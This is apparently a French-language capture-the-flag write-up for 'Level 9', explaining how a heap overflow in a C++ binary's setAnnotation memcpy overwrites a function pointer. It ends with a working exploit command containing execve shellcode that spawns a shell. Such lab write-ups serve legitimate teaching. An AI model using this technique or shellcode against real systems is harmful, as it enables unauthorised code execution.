## Level 9

En déssasemblant le binaire, on remarque que le code est en c++, à cause du mangling des fonctions.

Le binaire verifie dans un premier temps qu'il y a au moins un argument. Grace a l'utilitaire c++filt, nous pouvons retrouver les appels effectués.

c++filt -n "_Znwj" nous permet de reveler un premier appel a operator new qui permet d'allouer de la memoire.

L'appel ici aloue 0x6c, soit 108 bytes. La classe crée par l'allocation prends donc 108 bytes d'espace memoire.

c++filt -n "_ZN1NC1Ei" nous revele un appel a N::N(int nbr)

Cet appel appelle la fonction N de la classe N, son constructeur donc. Ce contructeur prends prends un int en paramettre, qui est assigné dans la classe a une variable.

Mis bout a bout, ces instructions se résument a créer une nouvelle instance de la classe N en passant en paramettre un int assigné.

La classe N contient trois autres fonctions: un overload d'operateur rhs pour le +, un autre pour le moins, et enfin setAnnotation. 

setAnnotation nous interesse particulierement car il s'agit d'un memcopy de la taille du strlen de av[1], dans le buffer Annotation de l'objet ciblé.

Cette fonction setAnnotation est appelée pour l'objet five.

On observe également un pointeur sur fonction qui est appellé a la fin du code. Cet appel est causé par l'addition de five + six, qui dans les fait appelle la fonction overloadée sur +. 

Pour réaliser notre exploit, nous allons donc remplacer l'adresse de la fonction overloadée par l'adresse de notre choix grace au memcpy(), et la faire pointer sur un shellcode.

On essaye de le faire segfault, et on y arrive avec une entrée de plus de 108 bytes.

![image](https://user-images.githubusercontent.com/29956389/89921241-b8b06c00-dbfd-11ea-96d3-85b5285a8c16.png)

Observons ou exactement le segfault se produit:

![image](https://user-images.githubusercontent.com/29956389/89924033-bc45f200-dc01-11ea-8464-47a4d8547077.png)

Logiquement, en revenant de la fonction qui fait l'appel a `memcpy()`, a
l'instruction:

`=> 0x08048682 <+142>:   mov    edx,DWORD PTR [eax]`

##### Analysons a présent ce qui se passe en mémoire:

On va placer un premier breakpoint avant l'appel a `memcpy()`.

![image](https://user-images.githubusercontent.com/29956389/89921779-6a4f9d00-dbfe-11ea-9fd2-3bbcc8b67065.png)

Puis un second, avant l'instruction `0x08048682 <+142>`. (L'instruction qui segfault)

![image](https://user-images.githubusercontent.com/29956389/89922513-6e2fef00-dbff-11ea-87ec-6a32def979d2.png)

Observons a présent les arguments passé a `memcpy()`

La destination:

![image](https://user-images.githubusercontent.com/29956389/89924553-7b9aa880-dc02-11ea-8917-befe848f6ea5.png)

La source :

![image](https://user-images.githubusercontent.com/29956389/89924594-88b79780-dc02-11ea-8646-f284151f7121.png)

Allons plus loin dans l'analyse de la destination:

![image](https://user-images.githubusercontent.com/29956389/89924810-d16f5080-dc02-11ea-8b1e-dfa19d36a0f8.png)

Voila donc la source su segfault, en dépassant, nous réécrivons sur l'adresse de la fonction operator+. 

Continuons donc jusqu'au prochain breakpoint, et regardont l'opération:

`=> 0x08048682 <+142>:   mov    edx,DWORD PTR [eax]`

![image](https://user-images.githubusercontent.com/29956389/89925747-1e075b80-dc04-11ea-8de5-72ee12931235.png)

En essayant de metrre `$EAX (0x42424242)` dans `$EDX`, le programme segfault car cet espace mémoire n'est pas valide. C'est donc ici que nous pouvont inserer une adresse choisis, pour rediriger l'execution. (`call edx` est appellé trois instructions plus loin). 

On essaye alors d'y mettre l'adresse de notre string (l'adresse destination du `memcpy()` et non l'adresse de l'argument de la stack).

On rajoute également un breakpoint avant l'instruction `=> 0x08048693 <+159>:   call   edx`

![image](https://user-images.githubusercontent.com/29956389/89927408-8d7e4a80-dc06-11ea-871d-8f7d54073e4f.png)

Maintenant que nous avons reussi a affecter `$EDX`, l'instruction `call` essaye de executer a cette adresse. (Car `call` n'est qu'un alias pour `push eip, jmp 0xadresse`).

Il faut donc maintenant, faire pointer `$EDX` vers une adresse valide, et c'est la que nous allons insérer notre shellcode. Ce qui nous donne:

`[Adresse de notre shellcode] + [SHELLCODE] + [Remplissage] + [Adresse de notre string]`.

Soit,

`[4 Bytes] + [28 Bytes de shellcode] + [76 (108 - 32) Bytes de remplissage] + [4 Bytes]`.

![image](https://user-images.githubusercontent.com/29956389/89928623-6294f600-dc08-11ea-8f82-1ec2b0c5eeec.png)

`./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*76 + "\x0c\xa0\x04\x08"')`

ou

`./level9 $(python -c 'print "\x10\xa0\x04\x08"')$(cat /tmp/shellcode.bin)$(python -c 'print "B" * 76 + "\x0c\xa0\x04\x08"')`
